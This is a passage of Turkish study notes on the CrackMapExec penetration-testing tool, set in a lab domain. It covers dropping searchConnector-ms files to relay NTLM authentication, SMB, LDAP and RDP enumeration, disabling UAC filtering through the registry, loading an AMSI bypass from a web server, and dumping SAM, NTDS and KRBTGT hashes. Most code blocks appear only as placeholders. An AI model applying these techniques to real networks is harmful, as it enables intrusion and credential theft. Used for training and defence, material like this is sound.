Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.

İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:

* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır

* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.

* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.

Drop-sc'yi iş başında görelim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak Yönlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:


### searchConnector-ms Dosyalarını Temizleme

{{CODE_BLOCK_125}}


LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.

Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:

| Komut                                                                 | Açıklama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |

Daha önce çalışmamış olanları gözden geçirelim:

### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma

Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.


### Sessions ve loggendon-users seçeneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.


### Oturum açmış kullanıcılarla filtre seçeneğini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.



### Enumerate Computers

CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar

### Domain'deki Bilgisayarları Numaralandırma

{{CODE_BLOCK_128}}


Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute

Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.


### List Local Users

{{CODE_BLOCK_130}}

Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.

`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain Gruplarını Numaralandırma

Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.

Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

